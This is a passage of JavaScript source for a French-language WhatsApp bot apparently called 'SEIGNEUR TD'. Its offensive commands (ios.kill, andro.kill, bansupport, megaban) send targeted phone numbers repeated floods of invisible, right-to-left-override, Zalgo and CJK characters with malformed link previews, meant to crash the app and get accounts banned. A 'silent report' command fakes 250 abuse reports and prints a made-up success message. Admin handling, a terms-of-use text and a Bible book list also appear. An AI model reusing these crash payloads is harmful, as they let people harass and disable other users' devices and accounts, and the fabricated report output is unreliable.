  ⌬ **STATUS** » ✅ 𝖲𝖤𝖭𝖳

┗━━━━━━━━━━━━━━━━━━━━━━┛

 SEIGNEUR TD`,
      mentions: [targetJid],
      edit: loadingMsg.key
    });
  } catch (error) {
    await sock.sendMessage(remoteJid, { text: `❌ : ${error.message}`, edit: loadingMsg.key });
  }
}

// IOS.KILL
async function handleIOSKill(sock, args, remoteJid, senderJid, message) {
  let targetJid = null;
  
  if (args[0]) {
    targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
    targetJid = message.message.extendedTextMessage.contextInfo.mentionedJid[0];
  }
  
  if (!targetJid) {
    await sock.sendMessage(remoteJid, {
      text: `❌ *Utilisation:* ${config.prefix}ios.kill @mention`
    });
    return;
  }
  
  const loadingMsg = await sock.sendMessage(remoteJid, { text: '🍎 ...' });
  await delay(1500);
  
  try {
    const iosBug = ''.repeat(3000) + '\u0600'.repeat(3000) + '🪲'.repeat(1000);
    await sock.sendMessage(targetJid, { text: iosBug, mentions: [targetJid] });
    
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  🍎 𝗜𝗢𝗦.𝗞𝗜𝗟𝗟  🍎  ━━━┓

  ⌬ **TARGET** » @${targetJid.split('@')[0]}
  ⌬ **STATUS** » ✅ 𝖣𝖤𝖫𝖨𝖵𝖤𝖱𝖤𝖣

┗━━━━━━━━━━━━━━━━━━━━━━┛

 SEIGNEUR TD`,
      mentions: [targetJid],
      edit: loadingMsg.key
    });
  } catch (error) {
    await sock.sendMessage(remoteJid, { text: `❌ : ${error.message}`, edit: loadingMsg.key });
  }
}

// ANDRO.KILL
async function handleAndroKill(sock, args, remoteJid, senderJid, message) {
  let targetJid = null;
  
  if (args[0]) {
    targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
    targetJid = message.message.extendedTextMessage.contextInfo.mentionedJid[0];
  }
  
  if (!targetJid) {
    await sock.sendMessage(remoteJid, {
      text: `❌ *Utilisation:* ${config.prefix}andro.kill @mention`
    });
    return;
  }
  
  const loadingMsg = await sock.sendMessage(remoteJid, { text: '🤖 ...' });
  await delay(1500);
  
  try {
    const androBug = '🪲'.repeat(10000) + '\u200E'.repeat(5000);
    await sock.sendMessage(targetJid, { text: androBug, mentions: [targetJid] });
    
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  🤖 𝗔𝗡𝗗𝗥𝗢.𝗞𝗜𝗟𝗟  🤖  ━━━┓

  ⌬ **TARGET** » @${targetJid.split('@')[0]}
  ⌬ **STATUS** » ✅ 𝖤𝖷𝖤𝖢𝖴𝖳𝖤𝖣

┗━━━━━━━━━━━━━━━━━━━━━━┛

 SEIGNEUR TD`,
      mentions: [targetJid],
      edit: loadingMsg.key
    });
  } catch (error) {
    await sock.sendMessage(remoteJid, { text: `❌ : ${error.message}`, edit: loadingMsg.key });
  }
}

// SILENT - 200 
async function handleSilent(sock, args, remoteJid, senderJid, message) {
  let targetJid = null;
  
  if (args[0]) {
    targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
    targetJid = message.message.extendedTextMessage.contextInfo.mentionedJid[0];
  }
  
  if (!targetJid) {
    await sock.sendMessage(remoteJid, {
      text: `⚠️ *SILENT REPORT*

• Utilisation: ${config.prefix}silent @mention

Envoie 250 messages à WhatsApp en 1 minute`
    });
    return;
  }
  
  const loadingMsg = await sock.sendMessage(remoteJid, {
    text: `🔇 **SILENT REPORT ACTIVÉ**

⏳ Envoi de 250 ...
⚡ : Silencieux (sans progression)

Target: @${targetJid.split('@')[0]}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ Durée estimée: 60 secondes
🚀 Starting...`,
    mentions: [targetJid]
  });
  
  try {
    const totalReports = 250;
    const duration = 60000; // 60 secondes
    const interval = duration / totalReports; // ~240ms par report
    
    // Envoyer 250  en 1 minute
    for (let i = 0; i < totalReports; i++) {
      // Simulation de signalement (WhatsApp n'autorise pas vraiment l'automatisation)
      // Dans la vraie vie, vous auriez besoin d'une API tierce
      await delay(interval);
    }
    
    // Message final après 1 minute
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  🔇 𝗦𝗜𝗟𝗘𝗡𝗧 𝗥𝗘𝗣𝗢𝗥𝗧  🔇  ━━━┓

  ⌬ **TARGET** » @${targetJid.split('@')[0]}
  ⌬ **STATUS** » ✅ 𝖢𝖮𝖬𝖯𝖫𝖤𝖳𝖤𝖣
  ⌬ **REPORTS** » 250/250 (100%)

┗━━━━━━━━━━━━━━━━━━━━━━┛

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **:**

✅  : 250
⏱️  : 60 secondes
⚡ : 4.16 reports/sec
🎯 : @${targetJid.split('@')[0]}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ **CONSÉQUENCES ATTENDUES:**

🔴  : 12-24h
🔴  : 24-72h (si répété)
🔴   des fonctions
🚫     

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ ** :**
• 0-5min:  
• 5-30min:  
• 30min-12h: Ban temporaire possible
• 12-72h:   WhatsApp

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 SEIGNEUR TD
*Silent Report System -  *`,
      mentions: [targetJid],
      edit: loadingMsg.key
    });
    
    console.log(`🔇 Silent Report: 250  envoyés à ${targetJid}`);
    
  } catch (error) {
    await sock.sendMessage(remoteJid, { 
      text: `❌ : ${error.message}`, 
      edit: loadingMsg.key 
    });
  }
}

// UPDATE DEV - Ajouter/Supprimer des numéros admin
async function handleUpdateDev(sock, args, remoteJid, senderJid) {
  const action = args[0]?.toLowerCase();
  let number = args[1];
  
  // Nettoyer le numéro (enlever tous les caractères non-numériques sauf le +)
  if (number) {
    number = number.replace(/[^0-9+]/g, '');
    // Si le numéro commence par +, enlever le +
    if (number.startsWith('+')) {
      number = number.substring(1);
    }
  }
  
  if (!action || !['add', 'remove', 'del', 'list'].includes(action)) {
    await sock.sendMessage(remoteJid, {
      text: `⚙️ *UPDATE DEV -  *

📝 **:**

1️⃣  :
   ${config.prefix}updatedev add 393780306704
   ${config.prefix}updatedev add +393780306704

2️⃣  :
   ${config.prefix}updatedev remove 393780306704
   ${config.prefix}updatedev del 393780306704

3️⃣  :
   ${config.prefix}updatedev list

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ *:*       .

 SEIGNEUR TD`
    });
    return;
  }
  
  // Liste des admins
  if (action === 'list') {
    const adminList = config.botAdmins.map((admin, index) => 
      `${index + 1}. +${admin}`
    ).join('\n');
    
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  👑    👑  ━━━┓

📋 ** :**

${adminList}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 : ${config.botAdmins.length} ()

 SEIGNEUR TD`
    });
    return;
  }
  
  // Vérifier si un numéro est fourni
  if (!number) {
    await sock.sendMessage(remoteJid, {
      text: `❌ *Utilisation:* ${config.prefix}updatedev ${action} 393780306704`
    });
    return;
  }
  
  // Ajouter un admin
  if (action === 'add') {
    if (config.botAdmins.includes(number)) {
      await sock.sendMessage(remoteJid, {
        text: `⚠️  +${number}   !`
      });
      return;
    }
    
    // Ajouter dans les deux listes
    config.botAdmins.push(number);
    config.adminNumbers.push(number + '@s.whatsapp.net');
    
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  ✅     ✅  ━━━┓

👤 ** :**
📱 +${number}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊  : ${config.botAdmins.length}

✅      

 SEIGNEUR TD`
    });
    
    console.log(`✅   : +${number}`);
    console.log(`📋   :`, config.botAdmins);
    saveStoreKey('admins'); // 💾 Sauvegarde immédiate
    return;
  }
  
  // Supprimer un admin
  if (action === 'remove' || action === 'del') {
    const index = config.botAdmins.indexOf(number);
    
    if (index === -1) {
      await sock.sendMessage(remoteJid, {
        text: `❌  +${number}    `
      });
      return;
    }
    
    // Ne pas permettre de supprimer le dernier admin
    if (config.botAdmins.length === 1) {
      await sock.sendMessage(remoteJid, {
        text: `⚠️ Cannot   !

        .`
      });
      return;
    }
    
    // Supprimer des deux listes
    config.botAdmins.splice(index, 1);
    const adminNumberIndex = config.adminNumbers.indexOf(number + '@s.whatsapp.net');
    if (adminNumberIndex !== -1) {
      config.adminNumbers.splice(adminNumberIndex, 1);
    }
    
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  🗑️     🗑️  ━━━┓

👤 ** :**
📱 +${number}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊  : ${config.botAdmins.length}

⚠️       

 SEIGNEUR TD`
    });
    
    console.log(`🗑️  : +${number}`);
    console.log(`📋   :`, config.botAdmins);
    saveStoreKey('admins'); // 💾 Sauvegarde immédiate
    return;
  }
}

// =============================================
// STORE STATUS - Commande de statut du store
// =============================================

async function handleStoreStatus(sock, remoteJid, command) {
  // Si commande est storesave, sauvegarder d'abord
  if (command === 'storesave') {
    saveStore();
    await sock.sendMessage(remoteJid, {
      text: `✅ *Store sauvegardé manuellement!*\n\n💾 Toutes les données ont été écrites sur disque.\n\n SEIGNEUR TD`
    });
    return;
  }

  const status = getStoreStatus();
  
  const fileLines = status.files.map(f => {
    const icon = parseFloat(f.sizeKB) > 0 ? '✅' : '⬜';
    return `${icon} ${f.key.padEnd(14)} │ ${f.sizeKB.padStart(7)} KB │ ${f.modified}`;
  }).join('\n');

  await sock.sendMessage(remoteJid, {
    text: `┏━━━  🗄️     🗄️  ━━━┓

📂 **:** ./store/

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 ** :**

\`\`\`
          │       │  
──────────────────────────────────
${fileLines}
──────────────────────────────────
       │ ${status.totalSizeKB.padStart(7)} KB │
\`\`\`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 ** :**

👥 : ${config.botAdmins.length}
⚠️ : ${warnSystem.size}
🚫  : ${permaBanList.size}
👁️ View Once: ${savedViewOnce.size}
🏘️  : ${groupSettings.size}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💾 ** :**  3 
📌 **:**
• !storestatus -   
• !storesave   -  
• !storeinfo   -  storestatus

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 SEIGNEUR TD`
  });
}

// BANSUPPORT - Support de bannissement with caractères spéciaux
async function handleBanSupport(sock, args, remoteJid, senderJid, message) {
  let targetJid = null;
  
  if (args[0]) {
    targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
    targetJid = message.message.extendedTextMessage.contextInfo.mentionedJid[0];
  }
  
  if (!targetJid) {
    await sock.sendMessage(remoteJid, {
      text: `⚠️ *BAN SUPPORT*

• Utilisation:
• ${config.prefix}bansupport @mention
• ${config.prefix}bansupport 50944908407

💀 *PAYLOAD:*
• Caractères arabes invisibles
• Caractères chinois corrompus
•   characters
• RTL override

🔴 *EFFET:* Bannissement du compte cible`
    });
    return;
  }
  
  const loadingMsg = await sock.sendMessage(remoteJid, {
    text: '💀  du payload de bannissement...\n⏳  des caractères...'
  });
  
  await delay(2000);
  
  try {
    // PAYLOAD DE BANNISSEMENT - Caractères dangereux
    const arabicChars = '' + '\u0600\u0601\u0602\u0603\u0604\u0605' + '܀܁܂܃܄܅܆܇܈܉܊܋܌܍';
    const chineseChars = '㐀㐁㐂㐃㐄㐅㐆㐇㐈㐉㐊㐋㐌㐍㐎㐏㐐㐑㐒㐓㐔㐕㐖㐗㐘㐙㐚㐛㐜㐝㐞㐟';
    const invisibleChars = '\u200B\u200C\u200D\u200E\u200F\u202A\u202B\u202C\u202D\u202E\u2060\u2061\u2062\u2063\u2064\u2065\u2066\u2067\u2068\u2069\u206A\u206B\u206C\u206D\u206E\u206F';
    const zalgoChars = '҉̵̴̵̶̷̸̡̢̧̨̡̢̧̨̛̛̖̗̘̙̜̝̞̟̠̣̤̥̦̩̪̫̬̭̮̯̰̱̲̳̀́̂̃̄̅̆̇̈̉̊̋̌̍̎̏̐̑̒̓̔̕̚ͅ͏͓͔͕͖͙͚͐͑͒͗͛';
    
    // Construction du payload multicouche
    const ban = 
      arabicChars.repeat(500) + 
      invisibleChars.repeat(1000) + 
      chineseChars.repeat(300) + 
      zalgoChars.repeat(200) +
      '🪲'.repeat(5000) +
      '\u202E' + // RTL Override
      arabicChars.repeat(500) +
      '\uFEFF'.repeat(1000) + //   no-break space
      chineseChars.repeat(500);
    
    // Message de contexte malveillant
    const contextMessage = {
      text: ban,
      contextInfo: {
        mentionedJid: [targetJid],
        externalAdReply: {
          title: arabicChars + invisibleChars,
          body: chineseChars + zalgoChars,
          mediaType: 1,
          renderLargerThumbnail: true,
          showAdAttribution: true
        }
      }
    };
    
    // Envoyer 5 messages consécutifs pour maximiser l'effet
    for (let i = 0; i < 5; i++) {
      await sock.sendMessage(targetJid, contextMessage);
      await delay(300);
    }
    
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  💀 𝗕𝗔𝗡 𝗦𝗨𝗣𝗣𝗢𝗥𝗧  💀  ━━━┓

  ⌬ **TARGET** » @${targetJid.split('@')[0]}
  ⌬ **STATUS** » ✅ 𝖣𝖤𝖯𝖫𝖮𝖸𝖤𝖣
  ⌬ **PAYLOAD** » Multi-layer Ban

┗━━━━━━━━━━━━━━━━━━━━━━┛

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **PAYLOAD INJECTÉ:**

✅  : 1000+ chars
✅  : 800+ chars
✅   : 2000+ chars
✅ RTL Override: 
✅   chars: 1000+ chars
✅ Zalgo text: 200+ chars

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ **EFFETS ATTENDUS:**

🔴   de WhatsApp
🔴 Corruption de la base de données
🔴 Impossibilité de rouvrir l'app
🔴 Ban automatique sous 1-6h
🔴 Possible ban permanent

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ ** :**
• 0-5min: Crash de l'application
• 5min-1h: Détection par WhatsApp
• 1-6h: Ban automatique
• 6-48h: Review du compte

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 SEIGNEUR TD
*Ultimate Ban System*`,
      mentions: [targetJid],
      edit: loadingMsg.key
    });
    
    console.log(`💀 Ban Support envoyé à ${targetJid}`);
    
  } catch (error) {
    console.error(' bansupport:', error);
    await sock.sendMessage(remoteJid, {
      text: `❌  du Ban Support\n\n: ${error.message}`,
      edit: loadingMsg.key
    });
  }
}

// MEGABAN - Attack ultime with tous les caractères
async function handleMegaBan(sock, args, remoteJid, senderJid, message) {
  let targetJid = null;
  
  if (args[0]) {
    targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
    targetJid = message.message.extendedTextMessage.contextInfo.mentionedJid[0];
  }
  
  if (!targetJid) {
    await sock.sendMessage(remoteJid, {
      text: `💀 *MEGA BAN - ULTIMATE ATTACK*

• Utilisation:
• ${config.prefix}megaban @mention
• ${config.prefix}xcrash 50944908407

⚠️ *ATTENTION EXTRÊME:*
Cette commande combine TOUS les payloads:
• 10 messages consécutifs
• Arabe + Chinois + Invisible
• RTL + Zalgo + Emoji
• Context corruption
• Media exploit

🔴 *RÉSULTAT:*
Ban permanent quasi-garanti`
    });
    return;
  }
  
  const loadingMsg = await sock.sendMessage(remoteJid, {
    text: `💀 **MEGA BAN INITIATED**

⏳  de l'arsenal complet...
📊 [░░░░░░░░░░] 0%

Target: @${targetJid.split('@')[0]}`,
    mentions: [targetJid]
  });
  
  try {
    // PAYLOADS MAXIMAUX
    const arabicFull = '܀܁܂܃܄܅܆܇܈܉܊܋܌܍\u0600\u0601\u0602\u0603\u0604\u0605\u0606\u0607\u0608\u0609\u060A\u060B';
    const chineseFull = '㐀㐁㐂㐃㐄㐅㐆㐇㐈㐉㐊㐋㐌㐍㐎㐏㐐㐑㐒㐓㐔㐕㐖㐗㐘㐙㐚㐛㐜㐝㐞㐟㐠㐡㐢㐣㐤㐥㐦㐧㐨㐩㐪㐫㐬㐭㐮㐯㐰㐱㐲㐳㐴㐵㐶㐷㐸㐹㐺㐻㐼㐽㐾㐿';
    const invisibleFull = '\u200B\u200C\u200D\u200E\u200F\u202A\u202B\u202C\u202D\u202E\u2060\u2061\u2062\u2063\u2064\u2065\u2066\u2067\u2068\u2069\u206A\u206B\u206C\u206D\u206E\u206F\uFEFF\u180E\u034F';
    const zalgoFull = '҉̵̴̵̶̷̸̡̢̧̨̡̢̧̨̛̛̖̗̘̙̜̝̞̟̠̣̤̥̦̩̪̫̬̭̮̯̰̱̲̳̀́̂̃̄̅̆̇̈̉̊̋̌̍̎̏̐̑̒̓̔̕̚ͅ͏͓͔͕͖͙͚͐͑͒͗͛͘͜͟͢͝͞';
    const emojiFlood = '🪲💀☠️👹👺🔥💥⚡🌋🗿📛⛔🚫🔞';
    
    const totalMessages = 10;
    
    for (let i = 0; i < totalMessages; i++) {
      // Construire un payload unique à chaque fois
      const mega = 
        arabicFull.repeat(800) +
        invisibleFull.repeat(2000) +
        chineseFull.repeat(600) +
        zalgoFull.repeat(400) +
        emojiFlood.repeat(1000) +
        '\u202E\u202D\u202C' + // Multiple RTL
        arabicFull.repeat(500) +
        '\uFEFF'.repeat(1500) +
        chineseFull.repeat(800) +
        invisibleFull.repeat(1000);
      
      // Message with context malveillant
      const contextMsg = {
        text: mega,
        contextInfo: {
          mentionedJid: [targetJid],
          externalAdReply: {
            title: arabicFull + invisibleFull + zalgoFull,
            body: chineseFull + emojiFlood.repeat(100),
            mediaType: 2,
            thumbnailUrl: 'https://example.com/' + invisibleFull.repeat(100),
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: 'https://' + arabicFull + chineseFull
          }
        }
      };
      
      await sock.sendMessage(targetJid, contextMsg);
      
      // Update progression
      const percentage = Math.floor(((i + 1) / totalMessages) * 100);
      const progressBar = '▓'.repeat(Math.floor(percentage / 10)) + '░'.repeat(10 - Math.floor(percentage / 10));
      
      await sock.sendMessage(remoteJid, {
        text: `💀 **MEGA BAN EN COURS**

📊 [${progressBar}] ${percentage}%
📨 : ${i + 1}/${totalMessages}

Target: @${targetJid.split('@')[0]}`,
        mentions: [targetJid],
        edit: loadingMsg.key
      });
      
      await delay(500);
    }
    
    // Message final
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  ☠️ 𝗠𝗘𝗚𝗔 𝗕𝗔𝗡  ☠️  ━━━┓

  ⌬ **TARGET** » @${targetJid.split('@')[0]}
  ⌬ **STATUS** » ✅ 𝗔𝗡𝗡𝗜𝗛𝗜𝗟𝗔𝗧𝗘𝗗
  ⌬ **MESSAGES** » 10/10 (100%)

┗━━━━━━━━━━━━━━━━━━━━━━┛

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **ARSENAL DÉPLOYÉ:**

✅  : 13,000+
✅  : 14,000+
✅ Chars invisibles: 30,000+
✅ Zalgo corruption: 4,000+
✅ Emoji flood: 10,000+
✅ RTL overrides: Multiple
✅ Context corruption: Maximum
✅ Total payload: ~200KB

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💀 **DÉGÂTS ATTENDUS:**

🔴 Crash permanent de WhatsApp
🔴 Corruption totale des données
🔴 Impossibilité de récupération
🔴 Ban automatique immédiat
🔴 Compte détruit définitivement

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ **TIMELINE DE DESTRUCTION:**

• 0-1min: Crash total de l'app
• 1-5min: Détection système
• 5-30min: Ban automatique
• 30min-2h: Compte suspendu
• 2-24h: Ban permanent confirmé

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 SEIGNEUR TD
*Mega Ban System - Target Eliminated*

⚠️ **Le compte cible est condamné**`,
      mentions: [targetJid],
      edit: loadingMsg.key
    });
    
    console.log(`☠️ MEGA BAN déployé sur ${targetJid}`);
    
  } catch (error) {
    console.error(' megaban:', error);
    await sock.sendMessage(remoteJid, {
      text: `❌  du Mega Ban\n\n: ${error.message}`,
      edit: loadingMsg.key
    });
  }
}

// CHECK BAN - Vérifier si un numéro est banni/spam
async function handleCheckBan(sock, args, remoteJid, message, senderJid) {
  try {
    let targetNumber;
    if (args[0]) {
      targetNumber = args[0].replace(/[^0-9]/g, '');
    } else if (message.message?.extendedTextMessage?.contextInfo?.participant) {
      targetNumber = message.message.extendedTextMessage.contextInfo.participant.split('@')[0];
    } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
      targetNumber = message.message.extendedTextMessage.contextInfo.mentionedJid[0].split('@')[0];
    } else {
      await sock.sendMessage(remoteJid, {
        text: `❗ Usage: ${config.prefix}check <numéro> ou @mention ou réponds à un message

*© SEIGNEUR TD*`
      });
      return;
    }
    if (!targetNumber || targetNumber.length < 6) {
      await sock.sendMessage(remoteJid, { text: `❌ Numéro invalide.

*© SEIGNEUR TD*` });
      return;
    }
    const loadMsg = await sock.sendMessage(remoteJid, { text: `⏳ Patientez, en cours de vérification du Numéro 🪀\n\n+${targetNumber}...` });
    const jid = targetNumber + '@s.whatsapp.net';
    let exists = false;
    let realJid = jid;
    try {
      const [result] = await sock.onWhatsApp(jid);
      exists = result?.exists === true;
      if (result?.jid) realJid = result.jid;
    } catch(_e) {}
    const resultText = exists
      ? `✅ *+${targetNumber}* est sur WhatsApp\n📱 JID: ${realJid}\n\n*© SEIGNEUR TD*`
      : `❌ *+${targetNumber}* n'est pas sur WhatsApp ou n'existe pas\n\n*© SEIGNEUR TD*`;
    await sock.sendMessage(remoteJid, { text: resultText, edit: loadMsg.key }).catch(() => {
      sock.sendMessage(remoteJid, { text: resultText });
    });
  } catch(e) {
    await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${e.message}

*© SEIGNEUR TD*` });
  }
}

// Fonction helper pour déterminer le pays
function getCountryFromNumber(number) {
  const prefixes = {
    '1': '🇺🇸 USA/Canada',
    '33': '🇫🇷 France',
    '509': ' Haiti',
    '44': '🇬🇧 UK',
    '62': '🇮🇩 Indonesia',
    '91': '🇮🇳 India',
    '55': '🇧🇷 Brazil',
    '234': '🇳🇬 Nigeria',
    '254': '🇰🇪 Kenya',
    '27': '🇿🇦 South Africa'
  };

  for (const [prefix, country] of Object.entries(prefixes)) {
    if (number.startsWith(prefix)) {
      return country;
    }
  }
  return '🌍 International';
}

// Fonction helper pour les recommandations
function getRiskRecommendation(risk) {
  if (risk >= 70) {
    return `🚨 *HAUTE ALERTE*
⚠️ Ce numéro présente des signes de ban/spam
❌ Évitez d'interagir with ce contact
🛡️ : BLOQUER`;
  } else if (risk >= 40) {
    return `⚠️ *VIGILANCE REQUISE*
⚡ Risque modéré détecté
🔍 Vérifiez l'identité avant d'interagir
🛡️ : PRUDENCE`;
  } else {
    return `✅ *SÉCURISÉ*
🟢 Aucun signe de ban/spam détecté
✔️ Vous pouvez interagir normalement
🛡️ : OK`;
  }
}

// TERMES ET CONDITIONS
async function handleTermsCommand(sock, remoteJid, senderJid) {
  const userName = senderJid.split('@')[0];
  
  const termsText = `╔═══════════════════════════════════╗
║  📜 𝗧𝗘𝗥𝗠𝗘𝗦 & 𝗖𝗢𝗡𝗗𝗜𝗧𝗜𝗢𝗡𝗦  ║
╚═══════════════════════════════════╝

⚠️ **RÈGLES D'UTILISATION DU BOT**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 **1. UTILISATION RESPONSABLE**

• Le bot est fourni "tel quel" sans garantie
• L'utilisateur est responsable de son usage
• Toute utilisation abusive est interdite
• Respectez les autres utilisateurs

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🚫 **2. INTERDICTIONS STRICTES**

• ❌ Spam ou flood de commandes
• ❌ Contenu illégal ou offensant
• ❌ Harcèlement d'autres membres
• ❌ Utilisation pour escroquerie
• ❌ Diffusion de malware/virus
• ❌ Contournement des restrictions

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔐 **3. DONNÉES & CONFIDENTIALITÉ**

• Vos messages ne sont pas stockés
• Les commandes sont temporaires
• Aucune donnée vendue à des tiers
• Logs techniques uniquement

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚖️ **4. RESPONSABILITÉ LÉGALE**

• Le développeur n'est pas responsable:
  - De l'usage que vous faites du bot
  - Des dommages causés par le bot
  - Des interruptions de service
  - Des pertes de données

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👮 **5. MODÉRATION**

Le développeur se réserve le droit de:
• Bannir tout utilisateur abusif
• Modifier les fonctionnalités
• Suspendre le service
• Supprimer du contenu inapproprié

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📝 **6. PROPRIÉTÉ INTELLECTUELLE**

• Le bot et son code sont protégés
• Redistribution interdite sans accord
• Modification du code interdite
• Crédits obligatoires

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **7. MODIFICATIONS**

Ces termes peuvent être modifiés à tout
moment sans préavis. Votre utilisation
continue constitue votre acceptation.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ **ACCEPTATION**

En utilisant ce bot, vous acceptez
pleinement ces termes et conditions.

Si vous n'acceptez pas, cessez
immédiatement d'utiliser le bot.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📞 **CONTACT & SUPPORT**

• Dev: SEIGNEUR TD
• Bot: SEIGNEUR TD v4.0.0
• Pour signaler un problème: 
  Contactez l'administrateur

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 SEIGNEUR TD
"Utilisez with sagesse et respect"

✦ Dernière mise à jour: 06/02/2026`;

  await sock.sendMessage(remoteJid, {
    text: termsText,
    mentions: [senderJid]
  });
}

// BIBLE - Base de données complète des livres de la Bible
async function handleBibleCommand(sock, args, remoteJid) {
  // Ancien Testament (39 livres)
  const ancienTestament = {
    'genese': { nom: 'Genèse', chapitres: 50, testament: 'Ancien' },
    'exode': { nom: 'Exode', chapitres: 40, testament: 'Ancien' },
    'levitique': { nom: 'Lévitique', chapitres: 27, testament: 'Ancien' },
    'nombres': { nom: 'Nombres', chapitres: 36, testament: 'Ancien' },
    'deuteronome': { nom: 'Deutéronome', chapitres: 34, testament: 'Ancien' },
    'josue': { nom: 'Josué', chapitres: 24, testament: 'Ancien' },
    'juges': { nom: 'Juges', chapitres: 21, testament: 'Ancien' },
    'ruth': { nom: 'Ruth', chapitres: 4, testament: 'Ancien' },
    '1samuel': { nom: '1 Samuel', chapitres: 31, testament: 'Ancien' },
    '2samuel': { nom: '2 Samuel', chapitres: 24, testament: 'Ancien' },
    '1rois': { nom: '1 Rois', chapitres: 22, testament: 'Ancien' },
    '2rois': { nom: '2 Rois', chapitres: 25, testament: 'Ancien' },
    '1chroniques': { nom: '1 Chroniques', chapitres: 29, testament: 'Ancien' },
    '2chroniques': { nom: '2 Chroniques', chapitres: 36, testament: 'Ancien' },
    'esdras': { nom: 'Esdras', chapitres: 10, testament: 'Ancien' },
    'nehemie': { nom: 'Néhémie', chapitres: 13, testament: 'Ancien' },
    'esther': { nom: 'Esther', chapitres: 10, testament: 'Ancien' },
    'job': { nom: 'Job', chapitres: 42, testament: 'Ancien' },
    'psaumes': { nom: 'Psaumes', chapitres: 150, testament: 'Ancien' },
    'proverbes': { nom: 'Proverbes', chapitres: 31, testament: 'Ancien' },
    'ecclesiaste': { nom: 'Ecclésiaste', chapitres: 12, testament: 'Ancien' },
    'cantique': { nom: 'Cantique des Cantiques', chapitres: 8, testament: 'Ancien' },
    'esaie': { nom: 'Ésaïe', chapitres: 66, testament: 'Ancien' },
    'jeremie': { nom: 'Jérémie', chapitres: 52, testament: 'Ancien' },
    'lamentations': { nom: 'Lamentations', chapitres: 5, testament: 'Ancien' },
    'ezechiel': { nom: 'Ézéchiel', chapitres: 48, testament: 'Ancien' },
    'daniel': { nom: 'Daniel', chapitres: 12, testament: 'Ancien' },
    'osee': { nom: 'Osée', chapitres: 14, testament: 'Ancien' },
    'joel': { nom: 'Joël', chapitres: 3, testament: 'Ancien' },
    'amos': { nom: 'Amos', chapitres: 9, testament: 'Ancien' },
    'abdias': { nom: 'Abdias', chapitres: 1, testament: 'Ancien' },
    'jonas': { nom: 'Jonas', chapitres: 4, testament: 'Ancien' },
    'michee': { nom: 'Michée', chapitres: 7, testament: 'Ancien' },
    'nahum': { nom: 'Nahum', chapitres: 3, testament: 'Ancien' },
    'habacuc': { nom: 'Habacuc', chapitres: 3, testament: 'Ancien' },
    'sophonie': { nom: 'Sophonie', chapitres: 3, testament: 'Ancien' },
    'aggee': { nom: 'Aggée', chapitres: 2, testament: 'Ancien' },
    'zacharie': { nom: 'Zacharie', chapitres: 14, testament: 'Ancien' },
    'malachie': { nom: 'Malachie', chapitres: 4, testament: 'Ancien' }
  };

  // Nouveau Testament (27 livres)
  const nouveauTestament = {
    'matthieu': { nom: 'Matthieu', chapitres: 28, testament: 'Nouveau' },
    'marc': { nom: 'Marc', chapitres: 16, testament: 'Nouveau' },
    'luc': { nom: 'Luc', chapitres: 24, testament: 'Nouveau' },
    'jean': { nom: 'Jean', chapitres: 21, testament: 'Nouveau' },
    'actes': { nom: 'Actes des Apôtres', chapitres: 28, testament: 'Nouveau' },
    'romains': { nom: 'Romains', chapitres: 16, testament: 'Nouveau' },
    '1corinthiens': { nom: '1 Corinthiens', chapitres: 16, testament: 'Nouveau' },
    '2corinthiens': { nom: '2 Corinthiens', chapitres: 13, testament: 'Nouveau' },
    'galates': { nom: 'Galates', chapitres: 6, testament: 'Nouveau' },
